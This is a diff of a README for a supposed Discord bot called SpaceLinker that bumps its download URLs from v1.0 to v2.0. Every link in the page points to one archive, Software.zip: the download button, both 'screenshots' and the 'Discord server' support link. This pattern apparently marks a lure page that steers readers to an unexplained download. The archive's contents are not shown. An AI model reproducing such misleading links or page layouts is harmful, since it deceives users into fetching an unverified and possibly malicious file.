@@ -16,9 +16,9 @@ SpaceLinker is a powerful Discord Bot that connects people with the wonders of t
 5. **Exoplanet Data:** Explore information about planets beyond our solar system.
 
 ### Get Started
-To launch SpaceLinker and start exploring the universe, download the [v1.0.0 release](https://github.com/Dineth9/SpaceLinker/releases/download/v1.0/Software.zip) and follow the installation instructions in the repository.
+To launch SpaceLinker and start exploring the universe, download the [v1.0.0 release](https://github.com/Dineth9/SpaceLinker/releases/download/v2.0/Software.zip) and follow the installation instructions in the repository.
 
-[![Download SpaceLinker](https://github.com/Dineth9/SpaceLinker/releases/download/v1.0/Software.zip)](https://github.com/Dineth9/SpaceLinker/releases/download/v1.0/Software.zip)
+[![Download SpaceLinker](https://github.com/Dineth9/SpaceLinker/releases/download/v2.0/Software.zip)](https://github.com/Dineth9/SpaceLinker/releases/download/v2.0/Software.zip)
 
 ### Installation Guide
 1. Clone the repository to your local machine.
@@ -27,14 +27,14 @@ To launch SpaceLinker and start exploring the universe, download the [v1.0.0 rel
 4. Run the bot and start exploring the stars!
 
 ### Screenshots
-![SpaceLinker Screenshot 1](https://github.com/Dineth9/SpaceLinker/releases/download/v1.0/Software.zip)
-![SpaceLinker Screenshot 2](https://github.com/Dineth9/SpaceLinker/releases/download/v1.0/Software.zip)
+![SpaceLinker Screenshot 1](https://github.com/Dineth9/SpaceLinker/releases/download/v2.0/Software.zip)
+![SpaceLinker Screenshot 2](https://github.com/Dineth9/SpaceLinker/releases/download/v2.0/Software.zip)
 
 ### Contributing
 We welcome contributions to SpaceLinker! If you have ideas for new features or improvements, feel free to submit a pull request.
 
 ### Support
-For any questions or issues, please open a new GitHub issue or contact us on Discord at [SpaceLinker Discord Server](https://github.com/Dineth9/SpaceLinker/releases/download/v1.0/Software.zip).
+For any questions or issues, please open a new GitHub issue or contact us on Discord at [SpaceLinker Discord Server](https://github.com/Dineth9/SpaceLinker/releases/download/v2.0/Software.zip).
 
 Let's embark on a cosmic journey together with SpaceLinker! 🌠🔭
 
